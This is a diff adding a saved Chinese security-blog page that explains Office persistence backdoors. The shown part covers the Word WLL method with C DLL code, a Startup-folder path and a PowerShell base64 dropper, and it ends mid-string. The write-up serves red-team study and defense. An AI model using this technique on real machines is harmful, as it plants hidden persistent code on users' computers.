@@ -1,0 +1,977 @@
+
+
+<script type="text/javascript" src="http://7u2ss1.com1.z0.glb.clouddn.com/love.js"></script>
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+	<script src="http://echarts.baidu.com/dist/echarts.common.min.js"></script>
+	<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+    </style>
+
+
+    
+
+    <title>Use Office to maintain persistence | </title>
+    <meta name="author" content="wiki">
+    
+    <meta name="description" content="0x00 前言
+对于Windows平台，Microsoft Office的普及率很高。站在攻击者的角度，通常会选择在Office软件中植入后门。
+我在一篇博客上看到了Office后门的多种利用方法，我对其进行了研究测试，挑选其中较为通用、隐蔽的方式，编写POC脚本实现自动利用。
+博客地址：
+http">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="Use Office to maintain persistence"/>
+    <meta property="og:site_name" content="wiki"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="wiki" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/lastest.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+</head>
+
+<style>
+
+</style>
+<body style="background-color:#2196f3">
+
+<script type="text/javascript"
+color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+    <script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.15.0/TweenMax.min.js"></script>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="indigo darken-1">
+    
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">wiki</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            首页
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            归档
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            分类
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            搜索
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-2" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="http://p4gdp8beq.bkt.clouddn.com/timgsi1.jpg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">wiki</p>
+                        <p class="desc">安全小白</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    首页
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    归档
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    分类
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    搜索
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-2" id="category-menu">
+    
+
+            
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">搜索</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+<div class="container main-container">
+    <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo darken-2">
+        <span class="breadcrumb">当前位置（分类目录）</span>
+        
+            
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+	<!-- 添加渲染 -->
+	<div id="toc" class="toc-article">
+		<strong class="toc-title"></strong>
+	</div> 
+        <div class="card-content">
+		  
+			
+            
+
+            <div class="article-title">
+                
+    
+        <h1>Use Office to maintain persistence</h1>
+    
+
+
+            </div>
+            <time class="red-link-context" datetime="2018-05-25T13:03:44.843Z"><a href="">2018-05-25</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+
+            <div class="toc red-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x00-前言"><span class="section table-of-contents-text">0x00 前言</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x01-简介"><span class="section table-of-contents-text">0x01 简介</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x02-Word-WLL"><span class="section table-of-contents-text">0x02 Word WLL</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1、手动测试"><span class="section table-of-contents-text">1、手动测试</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2、编写Powershell脚本实现"><span class="section table-of-contents-text">2、编写Powershell脚本实现</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x03-Excel-XLL"><span class="section table-of-contents-text">0x03 Excel XLL</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1、手动测试-1"><span class="section table-of-contents-text">1、手动测试</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2、编写Powershell脚本实现-1"><span class="section table-of-contents-text">2、编写Powershell脚本实现</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x04-Excel-VBA-add-ins"><span class="section table-of-contents-text">0x04 Excel VBA add-ins</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1、手动测试-2"><span class="section table-of-contents-text">1、手动测试</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2、编写Powershell脚本实现-2"><span class="section table-of-contents-text">2、编写Powershell脚本实现</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x05-PowerPoint-VBA-add-ins"><span class="section table-of-contents-text">0x05 PowerPoint VBA add-ins</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1、手动测试-3"><span class="section table-of-contents-text">1、手动测试</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2、编写Powershell脚本实现-3"><span class="section table-of-contents-text">2、编写Powershell脚本实现</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x06-检测和防御"><span class="section table-of-contents-text">0x06 检测和防御</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1、Word"><span class="section table-of-contents-text">1、Word</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2、Excel"><span class="section table-of-contents-text">2、Excel</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#3、PowerPoint"><span class="section table-of-contents-text">3、PowerPoint</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x07-小结"><span class="section table-of-contents-text">0x07 小结</span></a></li></ol>
+</div>
+
+
+            <div class="entry red-link-context">
+                <script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr>
+<p>对于Windows平台，Microsoft Office的普及率很高。站在攻击者的角度，通常会选择在Office软件中植入后门。</p>
+<p>我在一篇博客上看到了Office后门的多种利用方法，我对其进行了研究测试，挑选其中较为通用、隐蔽的方式，编写POC脚本实现自动利用。</p>
+<p><strong>博客地址：</strong></p>
+<p><a href="https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/" target="_blank" rel="noopener">https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/</a></p>
+<p>作者： William Knowles@william_knows</p>
+<p><strong>POC：</strong></p>
+<p><a href="https://github.com/3gstudent/Office-Persistence" target="_blank" rel="noopener">https://github.com/3gstudent/Office-Persistence</a></p>
+<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr>
+<p>本文将要介绍以下内容：</p>
+<ul>
+<li>针对Word、Excel、PowerPoint的四种后门利用方法</li>
+<li>编写Powershell脚本实现自动利用</li>
+<li>比较优缺点，分析防御方法</li>
+</ul>
+<h2 id="0x02-Word-WLL"><a href="#0x02-Word-WLL" class="headerlink" title="0x02 Word WLL"></a>0x02 Word WLL</h2><hr>
+<h3 id="1、手动测试"><a href="#1、手动测试" class="headerlink" title="1、手动测试"></a>1、手动测试</h3><p>开发工具：<code>VC6.0</code></p>
+<p>新建dll工程，代码如下：</p>
+<pre><code>BOOL APIENTRY DllMain( HANDLE hModule, 
+                       DWORD  ul_reason_for_call, 
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+        case DLL_PROCESS_ATTACH:
+            MessageBox(NULL,&quot;hello world，I&#39;m 3kb&quot;,&quot;title&quot;,MB_OK);
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+    }return TRUE;
+}
+</code></pre><p>编译成msg.dll，作如下设置减小编译文件体积：</p>
+<ul>
+<li>Build：release</li>
+<li>添加代码：#pragma comment(linker,”/OPT:nowin98”)</li>
+<li>工程设置-&gt;Win32 Release-&gt;C/C++-&gt;Code Generation-&gt;Use run-time library:-&gt;Multithreaded DLL</li>
+</ul>
+<p>经过优化，dll大小为3kb</p>
+<p>重命名为msg.wll，保存路径如下：</p>
+<p><code>C:\Users\a\AppData\Roaming\Microsoft\Word\Startup</code></p>
+<p>启动Word.exe，弹框，界面卡住，Word无法正常执行；关闭弹出的对话框后，Word正常启动</p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-15/2-1.png" alt="Alt text"></p>
+<p><strong>注：</strong></p>
+<p>通过Metasploit的<code>msfvenom</code>生成的dll，会导致Word程序崩溃</p>
+<p>修改c代码，实现启动计算器，代码如下：</p>
+<pre><code>BOOL APIENTRY DllMain( HANDLE hModule, 
+                       DWORD  ul_reason_for_call, 
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+        case DLL_PROCESS_ATTACH:
+            WinExec(&quot;calc.exe&quot;,SW_SHOWNORMAL);
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+    }return TRUE;
+}
+</code></pre><p>编译成calc.dll，优化后大小为3kb</p>
+<p>重命名为calc.wll，保存在路径<code>C:\Users\a\AppData\Roaming\Microsoft\Word\Startup</code></p>
+<p>启动Word.exe，弹出计算器，并且word正常启动</p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-15/2-2.png" alt="Alt text"></p>
+<p><strong>注：</strong></p>
+<p>Startup路径可保存多个wll，支持启动多个wll</p>
+<h3 id="2、编写Powershell脚本实现"><a href="#2、编写Powershell脚本实现" class="headerlink" title="2、编写Powershell脚本实现"></a>2、编写Powershell脚本实现</h3><p>wll路径对应的powershell代码如下：</p>
+<p><code>$env:APPDATA+&quot;\Microsoft\Word\Startup\calc.wll&quot;</code></p>
+<p>将编译好的3kb大小的calc.dll作base64加密并存储于变量中：</p>
+<pre><code>$fileContent = [System.IO.File]::ReadAllBytes(&#39;calc.dll&#39;)
+$fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content (&quot;calcdllbase64.txt&quot;) 
+</code></pre><p>得到</p>
+<p><code>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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAACjAQMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></p>
+<p>用变量$fileContent存储base64加密的calc.dll</p>
+<p>base64解密并释放calc.wll至Startup路径的代码如下：</p>
+<pre><code>$fileContent = &quot;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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY2FsYy5leGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAA0AAAACjAQMCowMjA4MEMwUDBYMGYwazBwMHUwgDCNMJcwrDC4ML4w4DDyME4xajEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA